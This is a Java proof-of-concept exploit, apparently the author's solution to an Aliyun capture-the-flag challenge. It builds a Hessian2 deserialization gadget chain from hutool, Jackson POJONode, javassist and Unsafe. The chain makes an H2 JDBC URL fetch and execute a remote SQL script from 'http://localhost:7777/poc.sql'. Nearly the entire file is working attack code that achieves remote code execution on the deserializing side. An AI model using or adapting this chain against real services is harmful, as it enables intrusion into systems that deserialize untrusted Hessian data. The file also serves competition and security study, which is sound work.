package com.aliyunctf.agent.solution;

import cn.hutool.core.map.SafeConcurrentHashMap;
import cn.hutool.core.util.ReflectUtil;
import cn.hutool.core.util.SerializeUtil;
import cn.hutool.db.ds.pooled.PooledDSFactory;
import cn.hutool.json.JSONObject;
import cn.hutool.setting.Setting;
import com.alibaba.com.caucho.hessian.io.Hessian2Input;
import com.alibaba.com.caucho.hessian.io.Hessian2Output;
import com.aliyunctf.agent.other.Bean;
import com.fasterxml.jackson.databind.node.POJONode;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import sun.misc.Unsafe;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.util.Base64;
import java.util.concurrent.atomic.AtomicReference;


public class AuthorPoc {
    public static void main(String[] args) throws Exception {
        gen("runscript from 'http://localhost:7777/poc.sql'");
    }

    public static void gen(String sql) throws Exception {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        Hessian2Output hessian2Output = new Hessian2Output(byteArrayOutputStream);

        hessian2Output.writeMapBegin(JSONObject.class.getName());
        hessian2Output.writeObject("whatever");

        String url = String.format("jdbc:h2:mem:test;init=%s", sql);

        Setting setting = new Setting();
        setting.put("url", url);
        setting.put("initialSize", "1");
        setting.setCharset(null);

        Unsafe unsafe = (Unsafe) ReflectUtil.getFieldValue(null, ReflectUtil.getField(Unsafe.class, "theUnsafe"));

        PooledDSFactory pooledDSFactory = (PooledDSFactory) unsafe.allocateInstance(PooledDSFactory.class);

        ReflectUtil.setFieldValue(pooledDSFactory, "dataSourceName", PooledDSFactory.DS_NAME);
        ReflectUtil.setFieldValue(pooledDSFactory, "setting", setting);
        ReflectUtil.setFieldValue(pooledDSFactory, "dsMap", new SafeConcurrentHashMap<>());

        Bean bean = new Bean();
        bean.setData(SerializeUtil.serialize(pooledDSFactory));

        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod ctMethod = ctClass.getDeclaredMethod("writeReplace");
        ctClass.removeMethod(ctMethod);
        ctClass.toClass();

        POJONode pojoNode = new POJONode(bean);

        Object object = new AtomicReference<>(pojoNode);

        hessian2Output.writeObject(object);
        hessian2Output.writeMapEnd();
        hessian2Output.close();

        byte[] data = byteArrayOutputStream.toByteArray();

//        System.out.println(Base64.getEncoder().encodeToString(data));

//        byte[] data = Base64.getDecoder().decode(body);
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(data);
        Hessian2Input hessian2Input = new Hessian2Input(byteArrayInputStream);
        hessian2Input.readObject();
    }
}
